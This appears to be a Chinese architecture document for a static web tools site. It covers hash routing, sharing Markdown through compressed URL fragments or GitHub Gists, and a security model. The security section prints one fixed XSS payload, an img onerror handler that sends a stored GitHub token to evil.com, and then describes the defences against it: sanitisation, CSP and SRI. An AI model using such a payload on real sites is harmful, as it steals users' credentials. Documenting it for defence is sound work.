# Mecha Tools — 架构说明

> 最后更新: 2026-07-28

本文说明本站怎么组织、怎么路由，以及「把状态塞进链接」这套分享模型——尤其是 Markdown 阅读器的即时链接（`?c=`）。

---

## 1. 总体结构

```
Tobenot-Web-Tools/
├── src/                 # React SPA 主站（工具集）
│   ├── tools/           # 各工具组件（如 markdown-reader、calendar）
│   ├── pages/           # 首页、关于、更新日志等
│   ├── data/routes.ts   # 工具注册表 + changelog
│   └── utils/hash.ts    # #hash 路由解析
├── apps/                # 独立单页 HTML（不经 React 路由）
├── docs/                # 规划与架构文档
└── scripts/             # 脚手架与自检脚本
```

| 层 | 职责 |
|----|------|
| React SPA | 主站工具；`#工具名` 直达；GitHub Pages 静态部署 |
| `apps/*` | 零依赖或轻量独立页，构建时打进 `dist/apps/` |
| 无后端 | 分享要么把状态放进 URL，要么走第三方托管（如 GitHub Gist） |

技术栈：React + Vite + Tailwind。样式以工具类为主，主题色在 `tailwind.config.js` 的 `mech`。

---

## 2. 路由：一切以 `#` 为界

主站使用 **hash 路由**（`src/utils/hash.ts`），形态为：

```
https://tools.tobenot.top/#<path>?<params>
```

示例：

- `#markdown-reader`
- `#markdown-reader?c=…&style=business`
- `#calendar?d=2026-07-28`

解析规则：`#` 后第一段是 path，`?` 后是查询串，用 `URLSearchParams` 读。

**为何用 hash：**

1. GitHub Pages 静态托管友好，刷新不 404。
2. `#` 后面的内容是 **URL fragment**，浏览器请求页面时 **不会发给服务器**——长度不受 Nginx 等默认 URL 上限约束，也不进服务端访问日志。
3. 天然适合「链接即状态」：换参数 = 换可分享的快照。

独立 HTML 在 `apps/`，不走这套 React hash 路由。

---

## 3. 分享模型：状态进链接

本站没有业务后端，跨设备/跨人共享靠两种手段：

| 模式 | 做法 | 适合 |
|------|------|------|
| **自包含（payload in URL）** | 状态编码后放进 `#…?…` | 小～中等体积；零账号、零上传 |
| **引用（id in URL）** | URL 只带 id，正文在外部存储 | 大文档、需长期托管/可删除 |

日历用 `?d=` 属于极简自包含。Markdown 阅读器两种都支持，见下一节。

同族做法在业界很常见：Mermaid Live Editor、TS Playground 等也是把编辑状态放进 URL fragment。

---

## 4. Markdown 阅读器：即时链接与 Gist

实现：`src/tools/markdown-reader/MarkdownReaderTool.tsx`  
线上入口：`https://tools.tobenot.top/#markdown-reader`

### 4.1 两种分享通道

| 参数 | 通道 | Token | 正文在哪 |
|------|------|-------|----------|
| `c` | 即时链接 | 不需要 | 压缩后在 URL 里 |
| `gist` | GitHub Secret Gist | 分享者需要；访客不需要 | GitHub；URL 只有 gist id |
| `style` | 可选 | — | 仅排版偏好（business / dark 等） |

同时带 `c` 与 `gist` 时，**优先 `c`**。

### 4.2 即时链接原理（`?c=`）

```
Markdown 原文
    ↓  LZString.compressToEncodedURIComponent  （lz-string@1.5.0）
URL 安全压缩串
    ↓  拼进 fragment
#markdown-reader?c=<压缩串>&style=business
    ↓  访客打开；阅读器 CDN 加载同版本 lz-string
LZString.decompressFromEncodedURIComponent
    ↓
渲染（阅读模式，不覆盖本机草稿）
```

要点：

1. **Fragment 不经服务器**  
   压缩串挂在 `#` 后，本站静态资源请求与内容载荷解耦；服务器侧 URL 长度限制不适用。

2. **真正的上限在浏览器 / 分享渠道**  
   现代浏览器地址栏可到约 MB 级。微信等 IM 可能截断超长链接——这是产品侧风险，不是压缩算法失败。

3. **中文文本压缩率高**  
   lz-string 做字典式压缩（吃重复子串）。设定文档、技术文里的高频词与套话重复多，几万汉字压完往往只有原文体积的一小部分。实测「三万字级」在浏览器内打开通常无压力。

4. **版本与函数必须配对**  
   - 生成端、解析端统一 `lz-string@1.5.0`  
   - 压：`compressToEncodedURIComponent`  
   - 解：`decompressFromEncodedURIComponent`  
   - 不要混用 base64/UTF16 变体，也不要对结果再手动 `encodeURIComponent`（该 API 已是 URL 安全字符集）

5. **拼链接时小心 `+`**  
   lz-string 的 URI 安全字母表含 `+` / `$`。`URLSearchParams` 读未编码的 `+` 会当成空格；库的 decompress 会把空格还原成 `+`，一般仍可用。生成侧本站采用 **手动拼接** `c=`，避免 `URLSearchParams` 改写字符。

6. **CDN 动态加载**  
   与 marked / mermaid 一样，阅读器按需 `loadScript` 拉取钉死版本的 lz-string，不新增 npm 依赖。任意第三方 HTML 也可用同一 CDN 在运行时压缩后生成链接。

### 4.3 容量怎么选

| 文档规模 | 建议 |
|----------|------|
| 几千字～几万字（压后远小于渠道截断风险） | `?c=` 即时链接 |
| 很大、或要可删除/可改托管副本 | `?gist=` |
| 本地磁盘路径 / `file://` | **不可行**：线上页不能读访客本地文件；请内联正文再压进 `c`，或改用 Gist |

### 4.4 任意 HTML 嵌入（运行时、零构建）

站内「分享与嵌入」弹窗有可复制示例。骨架如下：

```html
<script src="https://cdn.jsdelivr.net/npm/lz-string@1.5.0/libs/lz-string.min.js"></script>
<script type="text/markdown" id="doc-a">
# 标题
正文……
</script>
<a id="link-a" href="#">用 Mecha 阅读器打开</a>
<script>
  const md = document.getElementById('doc-a').textContent.trim();
  const c = LZString.compressToEncodedURIComponent(md);
  document.getElementById('link-a').href =
    'https://tools.tobenot.top/#markdown-reader?c=' + c + '&style=business';
</script>
```

注意：`file://` 下用 `fetch` 读旁边的 `.md` 会被浏览器拦住；把正文放进 `text/markdown` 脚本块可避开该坑。正文里不要出现字面量 `</script>`。

### 4.5 自检

```bash
node scripts/check-lz-url.mjs
```

校验 CDN 版 lz-string 的压/解往返，以及 `+`→空格→还原路径。

---

## 5. 相关文件速查

| 路径 | 说明 |
|------|------|
| `src/utils/hash.ts` | hash 路径与参数解析 |
| `src/utils/sanitize.ts` | HTML 净化（DOMPurify 封装），不可信正文的第一道防线 |
| `src/utils/loadScript.ts` | CDN 脚本加载 + 钉死版本与 SRI 清单 |
| `src/data/routes.ts` | 工具注册、页面标题、changelog |
| `src/tools/markdown-reader/MarkdownReaderTool.tsx` | `c` / `gist` / `style` 实现与嵌入指南 UI |
| `src/tools/calendar/CalendarTool.tsx` | `?d=` 轻量状态分享示例 |
| `scripts/check-lz-url.mjs` | 即时链接编码往返自检 |
| `scripts/check-csp.mjs` | CSP 内联脚本哈希与策略强度自检 |
| `docs/roadmap.md` | 演进规划（非现状架构） |

---

## 6. 设计取舍（简记）

- **有状态、无后端**：能进 URL 的不建库；太大再借 Gist。
- **钉死 CDN 版本**：分享链接是长期契约，解压库升级不能悄悄破坏旧链。
- **阅读模式不写 localStorage 草稿**：避免打开他人分享覆盖本机编辑中的文档。
- **不可信正文必须净化**：见下节。

---

## 7. 安全模型：不可信正文与凭证隔离

`?c=` / `?gist=` 让阅读器的正文来源从「本人输入」扩展到「互联网任意来源」。
这次扩展把渲染层从"个人编辑器"变成了"内容分发平台"，威胁模型必须相应升级。

### 7.1 为什么必须净化

`marked` v5+ **移除了内建 `sanitize` 选项**，Markdown 中的裸 HTML 会原样输出。
若直接 `dangerouslySetInnerHTML`，则任何人构造的链接都能在本站源下执行脚本，
进而读取同源 `sessionStorage` / `localStorage`——其中曾包含带 `gist` 权限的 GitHub Token。

**攻击链**（已修复）：

```
<img src=x onerror="fetch('https://evil.com/?t='+localStorage.getItem('md-reader:gist-token'))">
  → 压进 ?c=  → 受害者点开 → 零交互执行 → 凭证外发
```

注意 fragment 不经服务器，意味着此类 payload **不进访问日志、WAF 无法拦截、事后无法审计**。
"状态进链接"的优势反面就是防御盲区，因此防线必须全部落在客户端。

### 7.2 三层纵深防御

| 层 | 手段 | 位置 |
|----|------|------|
| ① 切断执行 | DOMPurify 净化渲染结果 | `src/utils/sanitize.ts` |
| ② 缩小赃物 | Token 移入 sessionStorage；阅读他人分享时**不读取** Token | `MarkdownReaderTool.tsx` |
| ③ 兜底 | CSP 白名单 + SRI，阻断脚本执行与数据外发 | `index.html`、`src/utils/loadScript.ts` |

**关键顺序**：净化必须放在「为标题注入 id」的 `replace` **之后**。
该 `replace` 会把捕获到的原始属性串原样搬回输出，
先净化再 replace 会让已被移除的危险属性重新混入。

### 7.3 具体约定

- **`FORBID_ATTR` 含 `style`**：除 CSS 注入外，任意 `style` 可用 `position:fixed`
  铺满视口做点击劫持覆盖层。本站排版全靠 `.md-preview` 选择器，禁掉无副作用；
  mermaid SVG 的表现属性（`fill` / `stroke` 等）走 `ADD_ATTR` 白名单，不受影响。
- **`script-src` 不含 `'unsafe-inline'`**：这是让 `onerror=` 这类内联事件失效的关键。
  页面自身那段防 FOUC 的内联脚本靠 sha256 哈希放行，
  改动后必须同步更新哈希——`npm run check:csp` 会在 CI 中强制校验。
- **mermaid 10.9.1 不依赖 `eval`**（已核实），故 CSP 无需放开 `'unsafe-eval'`。
- **Kroki 返回的 SVG 不得 `innerHTML`**：现有实现包成 Blob 用 `<img>` 加载，
  `<img>` 内的 SVG 不执行脚本，这是正确做法，请勿"优化"成内联。
- **所有 CDN 钉死版本并附 SRI**：见 `src/utils/loadScript.ts` 的 `CDN` 常量。
  升级时必须同步重算 integrity，否则脚本会被浏览器拒绝执行。

### 7.4 自检

```bash
npm run check       # CSP 哈希校验 + lz-string 往返校验
```

